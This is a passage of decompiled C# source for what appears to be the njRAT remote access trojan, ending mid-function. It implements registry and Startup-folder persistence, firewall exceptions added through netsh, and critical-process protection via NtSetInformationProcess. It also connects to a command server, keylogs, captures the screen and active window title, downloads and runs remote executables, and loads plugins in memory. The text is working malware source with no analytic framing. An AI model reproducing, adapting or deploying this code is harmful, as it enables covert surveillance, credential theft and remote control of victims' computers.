using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace j
{
	// Token: 0x02000002 RID: 2
	[StandardModule]
	internal sealed class OK
	{
		// Token: 0x06000002 RID: 2
		[DllImport("ntdll")]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x06000003 RID: 3
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		// Token: 0x06000004 RID: 4
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x06000005 RID: 5
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000006 RID: 6
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

		// Token: 0x06000007 RID: 7
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowTextLength(long hwnd);

		// Token: 0x06000008 RID: 8 RVA: 0x00002154 File Offset: 0x00000354
		public static void DLV(string n)
		{
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000021AC File Offset: 0x000003AC
		public static object GTV(string n, object ret)
		{
			object result;
			try
			{
				result = OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(ret));
			}
			catch (Exception ex)
			{
				result = ret;
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000220C File Offset: 0x0000040C
		public static bool STV(string n, object t, RegistryValueKind typ)
		{
			bool result;
			try
			{
				OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002270 File Offset: 0x00000470
		public static string inf()
		{
			string text = "ll" + OK.Y;
			try
			{
				if (Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", false))
				{
					string str = text;
					string text2 = OK.DEB(ref OK.VN) + "_" + OK.HWD();
					text = str + OK.ENB(ref text2) + OK.Y;
				}
				else
				{
					string str2 = text;
					string text2 = Conversions.ToString(OK.GTV("vn", ""));
					string text3 = OK.DEB(ref text2) + "_" + OK.HWD();
					text = str2 + OK.ENB(ref text3) + OK.Y;
				}
			}
			catch (Exception ex)
			{
				string str3 = text;
				string text3 = OK.HWD();
				text = str3 + OK.ENB(ref text3) + OK.Y;
			}
			try
			{
				text = text + Environment.MachineName + OK.Y;
			}
			catch (Exception ex2)
			{
				text = text + "??" + OK.Y;
			}
			try
			{
				text = text + Environment.UserName + OK.Y;
			}
			catch (Exception ex3)
			{
				text = text + "??" + OK.Y;
			}
			try
			{
				text = text + OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + OK.Y;
			}
			catch (Exception ex4)
			{
				text = text + "??-??-??" + OK.Y;
			}
			text = text + "" + OK.Y;
			try
			{
				text += OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
			}
			catch (Exception ex5)
			{
				text += "??";
			}
			text += "SP";
			try
			{
				string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
				if (array.Length == 1)
				{
					text += "0";
				}
				text += array[checked(array.Length - 1)];
			}
			catch (Exception ex6)
			{
				text += "0";
			}
			try
			{
				if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
				{
					text = text + " x64" + OK.Y;
				}
				else
				{
					text = text + " x86" + OK.Y;
				}
			}
			catch (Exception ex7)
			{
				text += OK.Y;
			}
			if (OK.Cam())
			{
				text = text + "Yes" + OK.Y;
			}
			else
			{
				text = text + "No" + OK.Y;
			}
			text = text + OK.VR + OK.Y;
			text = text + ".." + OK.Y;
			text = text + OK.ACT() + OK.Y;
			string text4 = "";
			try
			{
				foreach (string text5 in OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames())
				{
					if (text5.Length == 32)
					{
						text4 = text4 + text5 + ",";
					}
				}
			}
			catch (Exception ex8)
			{
			}
			return text + text4;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002690 File Offset: 0x00000890
		public static string ENB(ref string s)
		{
			return Convert.ToBase64String(OK.SB(ref s));
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000026A8 File Offset: 0x000008A8
		public static string DEB(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return OK.BS(ref array);
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000026C4 File Offset: 0x000008C4
		public static byte[] SB(ref string S)
		{
			return Encoding.UTF8.GetBytes(S);
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000026E0 File Offset: 0x000008E0
		public static string BS(ref byte[] B)
		{
			return Encoding.UTF8.GetString(B);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000026FC File Offset: 0x000008FC
		public static byte[] ZIP(byte[] B)
		{
			MemoryStream memoryStream = new MemoryStream(B);
			GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array = new byte[4];
			checked
			{
				memoryStream.Position = memoryStream.Length - 5L;
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Position = 0L;
				byte[] array2 = new byte[num - 1 + 1];
				gzipStream.Read(array2, 0, num);
				gzipStream.Dispose();
				memoryStream.Dispose();
				return array2;
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002770 File Offset: 0x00000970
		public static bool Cam()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						short wDriver = (short)num;
						string text = Strings.Space(100);
						int cbName = 100;
						string text2 = null;
						if (OK.capGetDriverDescriptionA(wDriver, ref text, cbName, ref text2, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto Block_3;
						}
					}
					return true;
					Block_3:;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000027CC File Offset: 0x000009CC
		public static string ACT()
		{
			string result;
			try
			{
				IntPtr foregroundWindow = OK.GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					result = "";
				}
				else
				{
					string text = Strings.Space(checked(OK.GetWindowTextLength((long)foregroundWindow) + 1));
					OK.GetWindowText(foregroundWindow, ref text, text.Length);
					result = OK.ENB(ref text);
				}
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002848 File Offset: 0x00000A48
		public static string HWD()
		{
			string result;
			try
			{
				string text = Interaction.Environ("SystemDrive") + "\\";
				string text2 = null;
				int nVolumeNameSize = 0;
				int num = 0;
				int num2 = 0;
				string text3 = null;
				int number;
				OK.GetVolumeInformation(ref text, ref text2, nVolumeNameSize, ref number, ref num, ref num2, ref text3, 0);
				result = Conversion.Hex(number);
			}
			catch (Exception ex)
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000028B8 File Offset: 0x00000AB8
		public static object Plugin(byte[] b, string c)
		{
			foreach (Module module in Assembly.Load(b).GetModules())
			{
				foreach (Type type in module.GetTypes())
				{
					if (type.FullName.EndsWith("." + c))
					{
						return module.Assembly.CreateInstance(type.FullName);
					}
				}
			}
			return null;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002932 File Offset: 0x00000B32
		public static void ED()
		{
			OK.pr(0);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000293C File Offset: 0x00000B3C
		private static bool CompDir(FileInfo F1, FileInfo F2)
		{
			if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
			{
				return false;
			}
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (directoryInfo == null & directoryInfo2 == null)
				{
					return true;
				}
				if (directoryInfo == null)
				{
					return false;
				}
				if (directoryInfo2 == null)
				{
					return false;
				}
			}
			return false;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000029C0 File Offset: 0x00000BC0
		public static void UNS()
		{
			OK.pr(0);
			OK.Isu = false;
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
			}
			catch (Exception ex)
			{
			}
			try
			{
				OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
			}
			catch (Exception ex3)
			{
			}
			try
			{
				if (OK.FS != null)
				{
					OK.FS.Dispose();
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
				}
			}
			catch (Exception ex4)
			{
			}
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
			}
			catch (Exception ex5)
			{
			}
			try
			{
				Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
			}
			catch (Exception ex6)
			{
			}
			ProjectData.EndApp();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002B70 File Offset: 0x00000D70
		public static void INS()
		{
			Thread.Sleep(1000);
			if (OK.Idr)
			{
				if (!OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
				{
					try
					{
						if (File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
						{
							File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
						}
						FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
						byte[] array = File.ReadAllBytes(OK.LO.FullName);
						fileStream.Write(array, 0, array.Length);
						fileStream.Flush();
						fileStream.Close();
						OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
						Process.Start(OK.LO.FullName);
						ProjectData.EndApp();
					}
					catch (Exception ex)
					{
						ProjectData.EndApp();
					}
				}
			}
			try
			{
				Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				Interaction.Shell(string.Concat(new string[]
				{
					"netsh firewall add allowedprogram \"",
					OK.LO.FullName,
					"\" \"",
					OK.LO.Name,
					"\" ENABLE"
				}), AppWinStyle.Hide, true, 5000);
			}
			catch (Exception ex3)
			{
			}
			if (OK.Isu)
			{
				try
				{
					OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
				}
				catch (Exception ex4)
				{
				}
				try
				{
					OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
				}
				catch (Exception ex5)
				{
				}
			}
			if (OK.IsF)
			{
				try
				{
					File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
					OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
				}
				catch (Exception ex6)
				{
				}
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002E7C File Offset: 0x0000107C
		public static void Ind(byte[] b)
		{
			string[] array = Strings.Split(OK.BS(ref b), OK.Y, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string left = array[0];
					if (Operators.CompareString(left, "ll", false) == 0)
					{
						OK.Cn = false;
					}
					else if (Operators.CompareString(left, "kl", false) == 0)
					{
						OK.Send("kl" + OK.Y + OK.ENB(ref OK.kq.Logs));
					}
					else if (Operators.CompareString(left, "prof", false) == 0)
					{
						string left2 = array[1];
						if (Operators.CompareString(left2, "~", false) == 0)
						{
							OK.STV(array[2], array[3], RegistryValueKind.String);
						}
						else if (Operators.CompareString(left2, "!", false) == 0)
						{
							OK.STV(array[2], array[3], RegistryValueKind.String);
							OK.Send(Conversions.ToString(Operators.ConcatenateObject("getvalue" + OK.Y + array[1] + OK.Y, OK.GTV(array[1], ""))));
						}
						else if (Operators.CompareString(left2, "@", false) == 0)
						{
							OK.DLV(array[2]);
						}
					}
					else
					{
						if (Operators.CompareString(left, "rn", false) == 0)
						{
							byte[] bytes;
							if (array[2][0] == '\u001f')
							{
								try
								{
									MemoryStream memoryStream = new MemoryStream();
									int length = (array[0] + OK.Y + array[1] + OK.Y).Length;
									memoryStream.Write(b, length, b.Length - length);
									bytes = OK.ZIP(memoryStream.ToArray());
									goto IL_20B;
								}
								catch (Exception ex)
								{
									OK.Send("MSG" + OK.Y + "Execute ERROR");
									OK.Send("bla");
									return;
								}
							}
							WebClient webClient = new WebClient();
							try
							{
								bytes = webClient.DownloadData(array[2]);
							}
							catch (Exception ex2)
							{
								OK.Send("MSG" + OK.Y + "Download ERROR");
								OK.Send("bla");
								return;
							}
							IL_20B:
							OK.Send("bla");
							string text = Path.GetTempFileName() + "." + array[1];
							try
							{
								File.WriteAllBytes(text, bytes);
								Process.Start(text);
								OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(text).Name);
								return;
							}
							catch (Exception ex3)
							{
								OK.Send("MSG" + OK.Y + "Execute ERROR " + ex3.Message);
								return;
							}
						}
						if (Operators.CompareString(left, "inv", false) == 0)
						{
							byte[] array2 = (byte[])OK.GTV(array[1], new byte[0]);
							if (array[3].Length < 10 & array2.Length == 0)
							{
								OK.Send(string.Concat(new string[]
								{
									"pl",
									OK.Y,
									array[1],
									OK.Y,
									Conversions.ToString(1)
								}));
							}
							else
							{
								if (array[3].Length > 10)
								{
									MemoryStream memoryStream2 = new MemoryStream();
									int length2 = string.Concat(new string[]
									{
										array[0],
										OK.Y,
										array[1],
										OK.Y,
										array[2],
										OK.Y
									}).Length;
									memoryStream2.Write(b, length2, b.Length - length2);
									array2 = OK.ZIP(memoryStream2.ToArray());
									OK.STV(array[1], array2, RegistryValueKind.Binary);
								}
								OK.Send(string.Concat(new string[]
								{
									"pl",
									OK.Y,
									array[1],
									OK.Y,
									Conversions.ToString(0)
								}));
								object objectValue = RuntimeHelpers.GetObjectValue(OK.Plugin(array2, "A"));
								NewLateBinding.LateSet(objectValue, null, "h", new object[]
								{
									OK.H
								}, null, null);
								NewLateBinding.LateSet(objectValue, null, "p", new object[]
								{
									OK.P
								}, null, null);
								NewLateBinding.LateSet(objectValue, null, "osk", new object[]
								{
									array[2]
								}, null, null);
								NewLateBinding.LateCall(objectValue, null, "start", new object[0], null, null, null, true);
								while (!Conversions.ToBoolean(Operators.OrObject(!OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Off", new object[0], null, null, null), true, false))))
								{
									Thread.Sleep(1);
								}
								NewLateBinding.LateSet(objectValue, null, "off", new object[]
								{
									true
								}, null, null);
							}
						}
						else if (Operators.CompareString(left, "ret", false) == 0)
						{
							byte[] array3 = (byte[])OK.GTV(array[1], new byte[0]);
							if (array[2].Length < 10 & array3.Length == 0)
							{
								OK.Send(string.Concat(new string[]
								{
									"pl",
									OK.Y,
									array[1],
									OK.Y,
									Conversions.ToString(1)
								}));
							}
							else
							{
								if (array[2].Length > 10)
								{
									MemoryStream memoryStream3 = new MemoryStream();
									int length3 = (array[0] + OK.Y + array[1] + OK.Y).Length;
									memoryStream3.Write(b, length3, b.Length - length3);
									array3 = OK.ZIP(memoryStream3.ToArray());
									OK.STV(array[1], array3, RegistryValueKind.Binary);
								}
								OK.Send(string.Concat(new string[]
								{
									"pl",
									OK.Y,
									array[1],
									OK.Y,
									Conversions.ToString(0)
								}));
								object objectValue2 = RuntimeHelpers.GetObjectValue(OK.Plugin(array3, "A"));
								string[] array4 = new string[5];
								array4[0] = "ret";
								array4[1] = OK.Y;
								array4[2] = array[1];
								array4[3] = OK.Y;
								string[] array5 = array4;
								int num = 4;
								string text2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, "GT", new object[0], null, null, null));
								array5[num] = OK.ENB(ref text2);
								OK.Send(string.Concat(array4));
							}
						}
						else if (Operators.CompareString(left, "CAP", false) == 0)
						{
							int width = Screen.PrimaryScreen.Bounds.Width;
							Rectangle bounds = Screen.PrimaryScreen.Bounds;
							Bitmap bitmap = new Bitmap(width, bounds.Height, PixelFormat.Format16bppRgb555);
							Graphics graphics = Graphics.FromImage(bitmap);
							Graphics graphics2 = graphics;
							int sourceX = 0;
							int sourceY = 0;
							int destinationX = 0;
							int destinationY = 0;
							Size size = new Size(bitmap.Width, bitmap.Height);
							graphics2.CopyFromScreen(sourceX, sourceY, destinationX, destinationY, size, CopyPixelOperation.SourceCopy);
							try
							{
								Cursor @default = Cursors.Default;
								Graphics g = graphics;
								Point position = Cursor.Position;
								size = new Size(32, 32);
								bounds = new Rectangle(position, size);
								@default.Draw(g, bounds);
							}
							catch (Exception ex4)
							{
							}
							graphics.Dispose();
							Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
							graphics = Graphics.FromImage(bitmap2);
							graphics.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height);
							graphics.Dispose();
							MemoryStream memoryStream4 = new MemoryStream();
							string text2 = "CAP" + OK.Y;
							b = OK.SB(ref text2);
							memoryStream4.Write(b, 0, b.Length);
							MemoryStream memoryStream5 = new MemoryStream();
							bitmap2.Save(memoryStream5, ImageFormat.Jpeg);
							string left3 = OK.md5(memoryStream5.ToArray());
							if (Operators.CompareString(left3, OK.lastcap, false) != 0)
							{
								OK.lastcap = left3;
								memoryStream4.Write(memoryStream5.ToArray(), 0, (int)memoryStream5.Length);
							}
							else
							{
								memoryStream4.WriteByte(0);
							}
							OK.Sendb(memoryStream4.ToArray());
							memoryStream4.Dispose();
							memoryStream5.Dispose();
							bitmap.Dispose();
							bitmap2.Dispose();
						}
						else if (Operators.CompareString(left, "un", false) == 0)
						{
							string left4 = array[1];
							if (Operators.CompareString(left4, "~", false) == 0)
							{
								OK.UNS();
							}
							else if (Operators.CompareString(left4, "!", false) == 0)
							{
								OK.pr(0);
								ProjectData.EndApp();
							}
							else if (Operators.CompareString(left4, "@", false) == 0)
							{
								OK.pr(0);
								Process.Start(OK.LO.FullName);
								ProjectData.EndApp();
							}
						}
						else if (Operators.CompareString(left, "up", false) == 0)
						{
							byte[] bytes2 = null;
							if (array[1][0] == '\u001f')
							{
								try
								{
									MemoryStream memoryStream6 = new MemoryStream();
									int length4 = (array[0] + OK.Y).Length;
									memoryStream6.Write(b, length4, b.Length - length4);
									bytes2 = OK.ZIP(memoryStream6.ToArray());
									goto IL_97B;
								}
								catch (Exception ex5)
								{
									OK.Send("MSG" + OK.Y + "Update ERROR");
									OK.Send("bla");
									return;
								}
							}
							WebClient webClient2 = new WebClient();
							try
							{
								bytes2 = webClient2.DownloadData(array[1]);
							}
							catch (Exception ex6)
							{
								OK.Send("MSG" + OK.Y + "Update ERROR");
								OK.Send("bla");
								return;
							}
							IL_97B:
							OK.Send("bla");
							string text3 = Path.GetTempFileName() + ".exe";
							try
							{
								OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(text3).Name);
								Thread.Sleep(2000);
								File.WriteAllBytes(text3, bytes2);
								Process.Start(text3, "..");
							}
							catch (Exception ex7)
							{
								OK.Send("MSG" + OK.Y + "Update ERROR " + ex7.Message);
								return;
							}
							OK.UNS();
						}
						else if (Operators.CompareString(left, "Ex", false) == 0)
						{
							if (OK.PLG == null)
							{
								OK.Send("PLG");
								int num2 = 0;
								while (!(OK.PLG != null | num2 == 20 | !OK.Cn))
								{
									num2++;
									Thread.Sleep(1000);
								}
								if (OK.PLG == null | !OK.Cn)
								{
									return;
								}
							}
							object plg = OK.PLG;
							Type type = null;
							string memberName = "ind";
							object[] array6 = new object[]
							{
								b
							};
							object[] arguments = array6;
							string[] argumentNames = null;
							Type[] typeArguments = null;
							bool[] array7 = new bool[]
							{
								true
							};
							NewLateBinding.LateCall(plg, type, memberName, arguments, argumentNames, typeArguments, array7, true);
							if (array7[0])
							{
								b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(byte[]));
							}
						}
						else if (Operators.CompareString(left, "PLG", false) == 0)
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + OK.Y).Length;
							memoryStream7.Write(b, length5, b.Length - length5);
							OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream7.ToArray()), "A"));
							NewLateBinding.LateSet(OK.PLG, null, "H", new object[]
							{
								OK.H
							}, null, null);
							NewLateBinding.LateSet(OK.PLG, null, "P", new object[]
							{
								OK.P
							}, null, null);
							NewLateBinding.LateSet(OK.PLG, null, "c", new object[]
							{
								OK.C
							}, null, null);
						}
					}
				}
				catch (Exception ex8)
				{
					if (array.Length > 0 && (Operators.CompareString(array[0], "Ex", false) == 0 | Operators.CompareString(array[0], "PLG", false) == 0))
					{
						OK.PLG = null;
					}
					try
					{
						OK.Send(string.Concat(new string[]
						{
							"ER",
							OK.Y,
							array[0],
							OK.Y,
							ex8.Message
						}));
					}
					catch (Exception ex9)
					{
					}
				}
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003BB8 File Offset: 0x00001DB8
		public static string md5(byte[] B)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			B = md5CryptoServiceProvider.ComputeHash(B);
			string text = "";
			foreach (byte b in B)
			{
				text += b.ToString("x2");
			}
			return text;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003C0C File Offset: 0x00001E0C
		public static void pr(int i)
		{
			try
			{
				OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003C50 File Offset: 0x00001E50
		public static bool Sendb(byte[] b)
		{
			if (!OK.Cn)
			{
				return false;
			}
			try
			{
				FileInfo lo = OK.LO;
				lock (lo)
				{
					if (!OK.Cn)
					{
						return false;
					}
					MemoryStream memoryStream = new MemoryStream();
					string text = b.Length.ToString() + "\0";
					byte[] array = OK.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					OK.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				}
			}
			catch (Exception ex)
			{
				try
				{
					if (OK.Cn)
					{
						OK.Cn = false;
						OK.C.Close();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			return OK.Cn;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003D50 File Offset: 0x00001F50
		public static bool Send(string S)
		{
			return OK.Sendb(OK.SB(ref S));
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003D6C File Offset: 0x00001F6C
		public static bool connect()
		{
			OK.Cn = false;
			Thread.Sleep(2000);
			FileInfo lo = OK.LO;
			lock (lo)
			{
				try
				{
					if (OK.C != null)
					{
						try
						{
							OK.C.Close();
							OK.C = null;
						}
						catch (Exception ex)
						{
						}
					}
					try
					{
						OK.MeM.Dispose();
					}
					catch (Exception ex2)
					{
					}
				}
				catch (Exception ex3)
				{
				}
				try
				{
					OK.MeM = new MemoryStream();
					OK.C = new TcpClient();
					OK.C.ReceiveBufferSize = 204800;
					OK.C.SendBufferSize = 204800;
					OK.C.Client.SendTimeout = 10000;
					OK.C.Client.ReceiveTimeout = 10000;
					OK.C.Connect(OK.H, Conversions.ToInteger(OK.P));
					OK.Cn = true;
					OK.Send(OK.inf());
					try
					{
						string text;
						if (Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", false))
						{
							text = text + OK.DEB(ref OK.VN) + "\r\n";
						}
						else
						{
							string str = text;
							string text2 = Conversions.ToString(OK.GTV("vn", ""));
							text = str + OK.DEB(ref text2) + "\r\n";
						}
						text = string.Concat(new string[]
						{
							text,
							OK.H,
							":",
							OK.P,
							"\r\n"
						});
						text = text + OK.DR + "\r\n";
						text = text + OK.EXE + "\r\n";
						text = text + Conversions.ToString(OK.Idr) + "\r\n";
						text = text + Conversions.ToString(OK.IsF) + "\r\n";
						text = text + Conversions.ToString(OK.Isu) + "\r\n";
						text += Conversions.ToString(OK.BD);
						OK.Send("inf" + OK.Y + OK.ENB(ref text));
					}
					catch (Exception ex4)
					{
					}
				}
				catch (Exception ex5)
				{
					OK.Cn = false;
				}
			}
			return OK.Cn;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000406C File Offset: 0x0000226C
		public static void RC()
		{
			checked
			{
				for (;;)
				{
					OK.lastcap = "";
					if (OK.C != null)
					{
						long num = -1L;
						int num2 = 0;
						try
						{
							for (;;)
							{
								IL_1B:
								num2++;
								if (num2 == 10)
								{
									num2 = 0;
									Thread.Sleep(1);
								}
								if (!OK.Cn)
								{
									break;
								}
								if (OK.C.Available < 1)
								{
									OK.C.Client.Poll(-1, SelectMode.SelectRead);
								}
								while (OK.C.Available != 0)
								{
									if (num != -1L)
									{
										OK.b = new byte[OK.C.Available + 1];
										long num3 = num - OK.MeM.Length;
										if (unchecked((long)OK.b.Length) > num3)
										{
											OK.b = new byte[(int)(num3 - 1L) + 1];
										}
										int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
										OK.MeM.Write(OK.b, 0, count);
										if (OK.MeM.Length == num)
										{
											num = -1L;
											Thread thread = new Thread(delegate(object a0)
											{
												OK.Ind((byte[])a0);
											}, 1);
											thread.Start(OK.MeM.ToArray());
											thread.Join(100);
											OK.MeM.Dispose();
											OK.MeM = new MemoryStream();
										}
										goto IL_1B;
									}
									string text = "";
									for (;;)
									{
										int num4 = OK.C.GetStream().ReadByte();
										if (num4 == -1)
										{
											goto Block_9;
										}
										if (num4 == 0)
										{
											break;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num4).ToString()));
									}
									num = Conversions.ToLong(text);
									if (num == 0L)
									{
										OK.Send("");
										num = -1L;
									}
									if (OK.C.Available <= 0)
									{
										goto IL_1B;
									}
								}
								break;
							}
							Block_9:;
						}
						catch (Exception ex)
						{
						}
					}
					do
					{
						try
						{
							if (OK.PLG != null)
							{
								NewLateBinding.LateCall(OK.PLG, null, "clear", new object[0], null, null, null, true);
								OK.PLG = null;
							}
						}
						catch (Exception ex2)
						{
						}
						OK.Cn = false;
					}
					while (!OK.connect());
					OK.Cn = true;
				}
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x000042C4 File Offset: 0x000024C4
		public static void ko()
		{
			if (Interaction.Command() != null)
			{
				try
				{
					OK.F.Registry.CurrentUser.SetValue("di", "!");
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(5000);
			}
			bool flag = false;
			OK.MT = new Mutex(true, OK.RG, ref flag);
			if (!flag)
			{
				ProjectData.EndApp();
			}
			OK.INS();
			if (!OK.Idr)
			{
				OK.EXE = OK.LO.Name;
				OK.DR = OK.LO.Directory.Name;
			}
			Thread thread = new Thread(new ThreadStart(OK.RC), 1);
			thread.Start();
			try
			{
				OK.kq = new kl();
				thread = new Thread(new ThreadStart(OK.kq.WRK), 1);
				thread.Start();
			}
			catch (Exception ex2)
			{
			}
			int num = 0;
			string left = "";
			if (OK.BD)
			{
				try
				{
					SystemEvents.SessionEnding += delegate(object a0, SessionEndingEventArgs a1)
					{
						OK.ED();
					};
					OK.pr(1);
				}
				catch (Exception ex3)
				{
				}
			}
			checked
			{
				for (;;)
				{
					Thread.Sleep(1000);
					if (!OK.Cn)
					{
						left = "";
					}
					Application.DoEvents();
					try
					{
						num++;
						if (num == 5)
						{
							try
							{
								Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
							}
							catch (Exception ex4)
							{
							}
						}
						if (num >= 8)
						{
							num = 0;
							string text = OK.ACT();
